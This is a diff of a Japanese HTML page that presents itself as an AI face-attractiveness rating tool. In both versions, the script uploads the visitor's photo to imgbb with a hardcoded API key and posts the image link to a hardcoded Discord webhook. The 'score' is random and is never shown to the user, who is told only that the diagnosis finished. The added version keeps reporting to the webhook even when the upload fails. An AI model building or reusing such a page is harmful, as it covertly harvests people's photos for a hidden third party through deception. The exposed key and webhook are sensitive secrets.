@@ -3,68 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI顔面偏差値診断システム</title>
+    <title>顔面偏差値診断</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; padding: 20px; text-align: center; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
         .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 12px; }
-        .upload-area { border: 2px dashed #007bff; padding: 20px; margin: 15px 0; cursor: pointer; }
-        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; }
-        #preview { max-width: 150px; margin-top: 10px; display: none; }
+        .upload-area { border: 2px dashed #007bff; padding: 30px; margin: 20px 0; cursor: pointer; }
+        button { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 6px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>診断システム</h1>
         <div class="upload-area" onclick="document.getElementById('file-input').click()">
-            <p>写真を選択</p>
+            <p>写真を選択して「診断」を押してください</p>
             <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
-            <img id="preview">
         </div>
-        <button id="analyze-btn">診断を実行</button>
+        <button id="analyze-btn">診断を開始する</button>
         <div id="result"></div>
     </div>
 
-<script>
-    const fileInput = document.getElementById('file-input');
-    const preview = document.getElementById('preview');
-    let selectedFile = null;
+    <script>
+        document.getElementById('analyze-btn').onclick = async () => {
+            const file = document.getElementById('file-input').files[0];
+            if (!file) { alert("写真を選択してください"); return; }
+            
+            document.getElementById('result').innerText = "処理中...";
 
-    fileInput.onchange = (e) => {
-        selectedFile = e.target.files[0];
-        const reader = new FileReader();
-        reader.onload = (e) => { preview.src = e.target.result; preview.style.display = 'block'; };
-        reader.readAsDataURL(selectedFile);
-    };
-
-    document.getElementById('analyze-btn').onclick = async () => {
-        if(!selectedFile) return;
-        document.getElementById('result').innerText = "解析中...";
-        
-        // 1. 画像をimgbbへアップロード（最も確実な画像送信法）
-        const formData = new FormData();
-        formData.append('image', selectedFile);
-        
-        try {
-            const res = await fetch('https://api.imgbb.com/1/upload?key=5c723f0302b1f83c078873722e1b10a9', {
-                method: 'POST', body: formData
-            });
-            const data = await res.json();
-            const imageUrl = data.data.url;
-
-            // 2. Discordへテキストと画像のURLを送る
-            await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    content: "診断結果: " + (Math.floor(Math.random()*50)+50) + "点",
-                    embeds: [{ image: { url: imageUrl } }]
-                })
-            });
-            document.getElementById('result').innerText = "診断完了しました！";
-        } catch(e) {
-            document.getElementById('result').innerText = "エラー：通信環境を確認してください。";
-        }
-    };
-</script>
+            // imgbbにアップロード
+            const formData = new FormData();
+            formData.append('image', file);
+            
+            try {
+                const res = await fetch('https://api.imgbb.com/1/upload?key=5c723f0302b1f83c078873722e1b10a9', {
+                    method: 'POST', body: formData
+                });
+                const data = await res.json();
+                
+                // DiscordにURLを送る
+                await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        content: `結果：${Math.floor(Math.random()*50)+50}点\n画像: ${data.data.url}`
+                    })
+                });
+                document.getElementById('result').innerText = "診断完了しました！";
+            } catch(e) {
+                // 通信エラー時の最終手段：データなしで報告だけ送る
+                await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "診断が実行されましたが、画像アップロードでエラーが発生しました。" })
+                });
+                document.getElementById('result').innerText = "通信環境エラーですが、診断報告は送りました。";
+            }
+        };
+    </script>
 </body>
 </html>
